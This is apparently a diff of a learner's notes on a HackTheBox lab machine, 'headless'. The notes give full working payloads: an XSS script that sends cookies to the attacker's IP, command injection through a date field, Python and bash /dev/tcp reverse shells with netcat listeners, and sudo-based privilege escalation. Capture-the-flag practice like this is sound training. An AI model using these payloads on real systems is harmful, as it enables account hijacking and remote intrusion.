@@ -13,32 +13,32 @@ Initial Info:
 
 1. Cookie stealing on headless.htb:5000/support form:
     a) placing script in user agent and message field
-        - COOKIE_STEAL_SCRIPT:: <script>var i=new Image(); i.src="http://10.10.14.154:8001/?cookie="+btoa(document.cookie);</script>
-        - lISTENER_COMMAND:: python -m http.server 8001
-        - STOLEN_COOKIE:: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+        - COOKIE_STEAL_SCRIPT$ <script>var i=new Image(); i.src="http://10.10.14.154:8001/?cookie="+btoa(document.cookie);</script>
+        - lISTENER_COMMAND$ python -m http.server 8001
+        - STOLEN_COOKIE$ is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 
 2. gaining access to console with reverse shell via burpsuite on headless.htb:5000/dashboard:
     a) used burpsuite interceptor to input stolen cookie to access website date/time formated form
-    b) appended "; ls" to end of date formated input through burp repeater to test command and it worked
+    b) appended "; ls" to end of date formated input through burp repeater to test command and it outputed files from system
     c) used reverse shell website and found a python format that worked and gave me access to the console
-        - REVERSE_SHELL_CMD:: export RHOST="10.10.14.104";export RPORT=2357;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
-        - LISTENER:: nc -lvnp 2357
-    d) found user flag in text file
+        - REVERSE_SHELL_CMD$ export RHOST="10.10.14.104";export RPORT=2357;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+        - LISTENER$ nc -lvnp 2357
+    d) found user flag in a text file
 
 3. privledge escalation through syscheck command:
     a) ran "sudo -l" and found syscheck command that requires no password
     b) cat out syscheck file and showed that it is running initdb.sh file
-    c) used reverse shell website again in bash format and ran echo'd it into initdb.sh with my own ip
-        - echo "sh -i >& /dev/tcp/10.10.14.104/1337 0>&1" > initdb.sh
-        - LISTENER$ nc -lvnp 1337
-    d) "sudo syscheck" ran this with elevated privledges without needing a password
+    c) used reverse shell website again in bash format and echo'd it into initdb.sh with my own ip
+        - $ echo "sh -i >& /dev/tcp/10.10.14.104/6543 0>&1" > initdb.sh
+        - LISTENER$ nc -lvnp 6543
+    d) "sudo syscheck" ran initdb.sh with elevated privledges without needing a password
         - gained root shell through listener
     e) found root flag in /root in text file
 
 
-Questions:
+Questions/Observations:
     1. why did inputting cookie steal script in user agent and message field work but one or the other didn't
-    2. when trying the reverse shell within initdb.sh, replacing just ip with own ip seemed to connect but nothing would output
-        - other formats for reverse shell from website would do same thing
+    2. when editing initdb.sh, replacing just ip with own ip seemed to connect but nothing would output
+        - other formats from reverse shell website would do same thing, the format listed in 3c was only one to output with "#" prompt
     3. there was no password when running "sudo -l" and there is when running it on my own system, is this due to hackthebox permissions that are set up?
-   
+    
